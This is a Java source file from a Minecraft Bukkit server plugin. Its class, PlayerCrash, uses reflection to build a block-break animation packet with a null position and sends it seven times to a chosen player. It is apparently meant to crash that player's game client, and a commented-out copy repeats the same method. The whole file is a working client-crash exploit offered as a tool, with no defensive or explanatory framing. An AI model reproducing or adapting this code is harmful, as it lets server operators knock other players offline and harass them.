package de.redstoneraudi.mctools.utils;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class PlayerCrash {
	
    private static String path;
    private static String version;
   
   
    static {
        path = Bukkit.getServer().getClass().getPackage().getName();
        version = path.substring(path.lastIndexOf(".")+1, path.length());
    }
	
	public static void crashPlayer(Player target) {
    	try {
    		Class<?> blockBreak = Class.forName("net.minecraft.server."+version+".PacketPlayOutBlockBreakAnimation");
    		Class<?> blockPosClass = Class.forName("net.minecraft.server."+version+".BlockPosition");
    		
    		Constructor<?> blockBreakConstructor = blockBreak.getConstructor(new Class<?>[] {int.class, blockPosClass, int.class});
    		Object removePacket = blockBreakConstructor.newInstance(new Object[] {0, null, 0});
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		sendPacket(target, removePacket);
    		
		} catch (ClassNotFoundException |NoSuchMethodException | SecurityException| InstantiationException | IllegalAccessException
				| IllegalArgumentException | InvocationTargetException e) {
			e.printStackTrace();
		}
		
//		PacketPlayOutBlockBreakAnimation packet = new PacketPlayOutBlockBreakAnimation(0, null, 0);
//		
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
//		((CraftPlayer)target).getHandle().playerConnection.sendPacket(packet);
		
	}

    private static void sendPacket(Player p, Object packet) {
        String path = Bukkit.getServer().getClass().getPackage().getName();
        String version = path.substring(path.lastIndexOf(".") + 1, path.length());
        try {
           Method getHandle = p.getClass().getMethod("getHandle");
           Object entityPlayer = getHandle.invoke(p);
           Object pConnection = entityPlayer.getClass().getField("playerConnection").get(entityPlayer);
           Class<?> packetClass = Class.forName("net.minecraft.server." + version + ".Packet");
           Method sendMethod = pConnection.getClass().getMethod("sendPacket", new Class[] { packetClass });
           sendMethod.invoke(pConnection, new Object[] { packet });
        } catch (Exception e) {
           e.printStackTrace();
        }
     }
	
}
